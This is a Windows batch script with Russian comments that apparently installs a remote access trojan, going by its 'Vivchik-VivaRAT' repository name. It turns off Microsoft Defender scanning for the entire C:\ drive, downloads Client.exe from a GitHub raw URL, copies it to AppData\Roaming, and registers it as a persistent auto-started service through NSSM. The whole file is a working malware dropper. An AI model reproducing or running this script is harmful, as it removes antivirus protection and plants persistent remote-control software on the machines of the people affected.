@echo off
setlocal

REM Установка переменных
set "REPO_OWNER=Vivchik-VivaRAT"
set "REPO_NAME=install"
set "CLIENT_NAME=Client.exe"
set "NSSM_URL=https://nssm.cc/release/nssm-2.24.zip"
set "CLIENT_URL=https://raw.githubusercontent.com/%REPO_OWNER%/%REPO_NAME%/main/%CLIENT_NAME%"
set "TEMP_DIR=%TEMP%\setup_%RANDOM%"
set "APPDATA_CLIENT=%APPDATA%\%CLIENT_NAME%"

REM Создание временной папки
mkdir "%TEMP_DIR%"
cd /d "%TEMP_DIR%"

REM Скачивание nssm
echo Скачивание NSSM...
powershell -Command "Invoke-WebRequest -Uri '%NSSM_URL%' -OutFile 'nssm.zip'"

REM Распаковка nssm
powershell -Command "Expand-Archive -Path 'nssm.zip' -DestinationPath 'nssm'"

REM Добавление диска C в исключения
powershell -Command "Add-MpPreference -ExclusionPath C:\"

REM Скачивание client.exe
echo Скачивание %CLIENT_NAME%...
powershell -Command "Invoke-WebRequest -Uri '%CLIENT_URL%' -OutFile '%CLIENT_NAME%'"

REM Копирование client.exe в AppData\Roaming
copy /Y "%CLIENT_NAME%" "%APPDATA_CLIENT%"
echo Скопировано %CLIENT_NAME% в %APPDATA_CLIENT%

REM Установка клиента как сервис через nssm
"%TEMP_DIR%\nssm\nssm-2.24\win64\nssm.exe" install MyClientService "%APPDATA_CLIENT%"
"%TEMP_DIR%\nssm\nssm-2.24\win64\nssm.exe" start MyClientService

echo Готово! Сервис MyClientService установлен и запущен.
pause
